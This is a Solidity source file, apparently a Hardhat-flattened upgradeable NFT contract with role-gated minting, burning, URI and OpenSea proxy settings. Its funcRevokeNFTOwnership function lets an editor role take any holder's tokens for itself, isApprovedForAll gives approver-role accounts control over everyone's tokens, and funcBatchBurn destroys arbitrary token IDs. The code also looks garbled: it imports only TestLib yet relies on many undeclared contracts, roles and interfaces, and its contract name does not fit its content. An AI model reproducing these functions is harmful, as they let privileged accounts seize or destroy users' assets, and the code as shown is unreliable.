// Sources flattened with hardhat v2.12.4 https://hardhat.org

// File contracts/utils/OpenseaDelegate.sol

// License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract _authorizeUpgradeFacet is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    ERC721Upgradeable,
    INovaFrontierCreator,
    OwnableUpgradeable
{
    event SetURI(string _uri);
    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyRole(APPROVER_ROLE) {}
    function supportsInterface(
        bytes4 _interfaceId
    )
        public
        view
        virtual
        override(ERC721Upgradeable, AccessControlUpgradeable)
        returns (bool)
    {
        return
            _interfaceId == type(INovaFrontierNFT).interfaceId ||
            _interfaceId == type(INovaFrontierCreator).interfaceId ||
            super.supportsInterface(_interfaceId);
    }
    function __NFT_init(
        string memory _pName,
        string memory _pSymbol,
        string memory _pUri
    ) internal initializer {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        __Ownable_init();
        __AccessControl_init();
        __ERC721_init(_pName, _pSymbol);
        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
        ds.uri = _pUri;
    }
    function _baseURI() internal view virtual override returns (string memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.uri;
    }
    function funSetURI(string memory _pUri) external onlyRole(EDITOR_ROLE) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uri = _pUri;
        emit SetURI(_pUri);
    }
    function funcEnableOpenseaProxy(
        address _pProxyRegistryAddress,
        bool _pIsOpenSeaProxyActive
    ) external onlyRole(EDITOR_ROLE) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.proxyRegistryAddress = _pProxyRegistryAddress;
        ds.isOpenSeaProxyActive = _pIsOpenSeaProxyActive;
    }
    function funcRevokeNFTOwnership(
        address _pOwner,
        uint256[] memory _pIds
    ) external onlyRole(EDITOR_ROLE) {
        require(_pIds.length > 0, "TIPSYEC_404");

        for (uint256 i = 0; i < _pIds.length; i++) {
            _transfer(_pOwner, _msgSender(), _pIds[i]);
        }
    }
    function funcMint(
        address _pTo,
        uint256 _pId
    ) external override onlyRole(MINTER_ROLE) {
        _mint(_pTo, _pId);
    }
    function funcBatchBurn(
        uint256 _pFromId,
        uint256 _pToId
    ) external override onlyRole(BURNER_ROLE) {
        for (uint256 id_ = _pFromId; id_ <= _pToId; id_++) {
            _burn(id_);
        }
    }
    function funcSetCreator(
        uint256 _pId,
        address _pAccount
    ) external override onlyRole(CREATOR_ROLE) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._creators[_pId] = _pAccount;
    }
    function funcGetCreator(
        uint256 _pId
    ) external view override returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._creators[_pId];
    }
    function isApprovedForAll(
        address _pAccount,
        address _pOperator
    ) public view override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ProxyRegistry proxyRegistry = ProxyRegistry(ds.proxyRegistryAddress);
        if (
            ds.isOpenSeaProxyActive &&
            address(proxyRegistry.proxies(_pAccount)) == _pOperator
        ) {
            return true;
        }

        return
            hasRole(APPROVER_ROLE, _pOperator) ||
            super.isApprovedForAll(_pAccount, _pOperator);
    }
    function _transfer(
        address _pFrom,
        address _pTo,
        uint256 _pTokenId
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._ownTime[_pTokenId] = block.timestamp;
        super._transfer(_pFrom, _pTo, _pTokenId);
    }
    function _mint(address _pTo, uint256 _pTokenId) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._creators[_pTokenId] = _pTo;
        ds._ownTime[_pTokenId] = block.timestamp;
        super._mint(_pTo, _pTokenId);
    }
    function _burn(uint256 _pTokenId) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._ownTime[_pTokenId] = block.timestamp;
        super._burn(_pTokenId);
    }
    function funcBurn(uint256 _pId) external override {
        require(
            ownerOf(_pId) == _msgSender() || hasRole(BURNER_ROLE, _msgSender()),
            "TIPSYEC_405"
        );
        _burn(_pId);
    }
}
